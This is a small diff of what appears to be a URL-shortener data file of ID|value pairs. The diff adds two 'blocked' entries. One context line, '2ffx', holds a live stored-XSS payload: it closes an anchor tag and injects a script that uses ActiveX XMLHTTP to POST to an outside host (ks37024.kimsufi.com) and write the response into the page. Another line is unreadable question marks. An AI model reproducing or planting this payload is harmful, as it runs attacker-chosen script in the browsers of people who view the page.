@@ -2,3 +2,5 @@
 kyds|http://news.google.com/news/url?fd=R&sa=T&url=http%3A%2F%2Fwww.techcrunch.com%2F2009%2F10%2F24%2Ftwitter-finally-removing-deleted-tweets-from-search-results%2F&usg=AFQjCNGI5L-HDfSehtJJtWXMfEFDDTvYlg
 2ffx|"></a><script>xmlhttp1 = new ActiveXObject('Microsoft.XMLHTTP');xmlhttp1.open('POST','http://ks37024.kimsufi.com/~minilien/ajout.php',false);xmlhttp1.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp1.send('lurl=XSS');document.write(xmlhttp1.responseText);alert(xmlhttp1.responseText);</script><BR>aa
 3rqr|"??? ??? ????? ??? ???? ???? ????"
+96xy|blocked
+3u9r|blocked
